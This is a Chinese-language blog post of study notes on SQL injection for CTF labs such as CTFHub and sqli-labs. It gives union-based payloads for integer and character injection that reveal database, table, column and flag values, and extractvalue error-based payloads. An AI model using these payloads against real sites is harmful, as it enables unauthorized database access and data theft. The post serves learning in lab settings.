---
layout: post
title: sql初
date: 2025-07-07 16:51:28 +0800
categories: [web]
---

过于信任用户，导致对用户输入信息没有过滤，那么用户就可以输入一些恶意代码导致数据库异常查询，从而产生了输入问题）

判断sql注入
1‘and1=1#，1'and1=2#  等于1对2错  说明存在SQL注入
1'order by 3#证明该数据库有几列，by3如果报错或者没得说明没得第三列
1’ union select user(),database()#

**<mark>*注意：首先做sql注入，就应该要知道参数是什么*</mark>**
（sql-labs和ctfhub参数都是id，所以输入就用？id=1开始的，但是其他不一定参数是这个，这里swpuctf里面参数就是wllm）

 SQL注入中，注释#、 --+、 --%20、 %23的意思：
1.# 和 -- （有个空格）表示注释，可以使它们后面的语句不被执行。在url中，如果是get请求**(记住是get请求，也就是我们在浏览器中输入的url)** ，解释执行的时候，url中#号是用来指导浏览器动作的，对服务器端无用。所以，HTTP请求中不包括#，因此使用#闭合无法注释，会报错；而使用-- （有个空格），在传输过程中空格会被忽略，同样导致无法注释，所以在get请求传参注入时才会使用--+的方式来闭合，因为+会被解释成空格。

2.当然，也可以使用--%20，把空格转换为urlencode编码格式，也不会报错。同理把#变成%23,也不报错。

3.如果是post请求，则可以直接使用#来进行闭合。常见的就是表单注入，如我们在后台登录框中进行注入。

4.为什么--后面必须要有空格，而#后面就不需要？
因为使用--注释时，需要使用空格，才能形成有效的sql语句，而#后面可以有空格，也可以没有，sql就是这么规定的，记住就行了。
因为不加空格，--直接和系统自动生成的单引号连接在了一起，会被认为是一个关键词，无法注释掉系统自动生成的单引号。

**联合查询中只要 union 前面的查询失败，那么 union 后面的查询结果就能回显到页面**

//（这里是ctfhub题）
#### **整数型注入：**
**输入**1
**判断**下一步恒真式，1 and 1=1
1=2，发现应该是数字型
下一步看看**存在几列数据**，
1 order by 1，1 order by 2，1 order by 3这样
然后进行联合查询了，这里引入**union**，
**然后第一步，数据库，肯定要从库开始查询，**
这里的，<mark>要先将联合查询之前的值设为一个不存在的，这里一般我给的是-1。这个肯定不存在。</mark>
可以先试试这种-1 union select 1,2  然后可以发现输出得ID：1，Data：2
（这个语句就是-1 union select xx，yy，然后输出id和data内容xx和yy，把里面输成database（）或者user（）这种可以调出库这种）
**爆库：库：database。**
-1 union select 1,database()
然后爆出了，*sqli，这一个库*。这里输出得到Data是sqli
接着我们开始爆表。
**爆表：表：tables.**
这里用到的sql语句是
group_concat(<mark>**table_name**</mark>) from information_schema.**table<mark>s</mark> where *==table_schema='sqli'==
     `select * from news where id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'`
这里爆出了*flag和news两个表*，
**然后爆列。**
**列：column**
group_concat(column_name) from information_schema.columns where table_name='flag'
    `select * from news where id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'`
然后就是结果了，
**爆字段/字段值
group_concat(flag) from sqli.flag
或者直接写
flag from sqli.flag
`select * from news where id=-1 union select 1,flag from sqli.flag`

**（总结一下爆表，爆列这种语句相似，大致结构
group_concat(XX_name) from information_schema.XXs where XX_schema ='YY'
这里XX爆表是table，爆列是column，YY是爆出来的库和列，上面例子是sqli和flag）


#### **字符型注入：**
**输入**1‘--+（某种意义上相当于输入1，也可以输入1）
    `select * from news where id='1' -- '`
**判断**   1’ and ’1‘=‘1
（注意一下，字符型最后它自动带’，所以是1‘ and ’1‘**=’1**）
**看列**
<mark>1'</mark> order by 1<mark>--+</mark>
（后面都要加上--+，这也是字符型的特点）
两列
/?id=1' order by 1,2 --+
**通过占位符查看回显**
/?id=-1' union select 1,2 --+
**当前数据库**
/?id=-1' union select 1,database() --+
**爆表**
/?id=-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x73716c69 --+
**爆字段**/**列**
/?id=-1' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x666c6167--+
（这里的0x73716c69 ，0x666c6167都是转过16进制的，便于输入吧，其实可以像上面那样，直接单引号加爆出来的表和列，‘sqli’和‘flag’这样）
**爆字段值**
/?id=-1' union select 1,flag from sqli.flag --+

***（字符型其实和数字型差不多，就是特点是单引号和末尾加--+或者---加减都可以，sql-labs好像是都行，但是其他不一定，所以建议用--+更好）

#### 报错注入
        （跟前两不一样，这次开始随便输入什么好像都显示查询正确）

这里输1等等这种数字型都显示查询正确，输入1‘这种字符型带单引号都显示查询错误
        查询错误: You have an error in your SQL syntax;

爆库
1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))
得到sqli，

**查看当前数据库下所有的表**\
1 and (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema= 'sqli'))))


1 and extractvalue(null,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))

1 union select 1,extractvalue(1,concat(0x7e,(select (table_name) from information_schema.tables where table_schema=database()limit 1,1),0x7e))






————————————————

详见原文：https://blog.csdn.net/2301_80911344/article/details/137608529，这个也不错
